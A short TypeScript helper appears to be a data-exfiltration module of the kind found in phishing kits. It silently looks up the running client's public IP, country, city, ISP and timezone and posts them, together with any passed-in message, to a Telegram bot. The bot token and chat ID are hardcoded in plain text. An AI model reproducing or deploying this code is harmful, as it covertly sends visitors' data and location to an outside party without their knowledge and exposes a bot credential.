import axios from "axios";

export const sendTelegramMessage = async (message: string) => {
  const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA"; // Your bot token
  const chatId = "1303640598"; // Your chat ID

  if (!botToken || !chatId) {
    console.error("Bot token or chat ID is missing.");
    return;
  }

  try {
    // Get Public IP
    const ipResponse = await axios.get("https://api.ipify.org?format=json");
    const ip = ipResponse.data.ip;

    // Get Geolocation Data
    const locationResponse = await axios.get(`http://ip-api.com/json/${ip}`);
    const location = locationResponse.data;

    const locationInfo = `
IP Address: ${ip}
Country: ${location.country}
City: ${location.city}
ISP: ${location.isp}
Timezone: ${location.timezone}
`;

    const finalMessage = `${message}\n\n📍 Location Info:\n${locationInfo}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("text", finalMessage);

    const response = await fetch(url, {
      method: "POST",
      body: formData,
    });

    const responseData = await response.json();

    if (responseData.ok) {
      console.log("Message sent successfully with location.");
    } else {
      console.error("Telegram API Error:", responseData.description);
    }
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
};
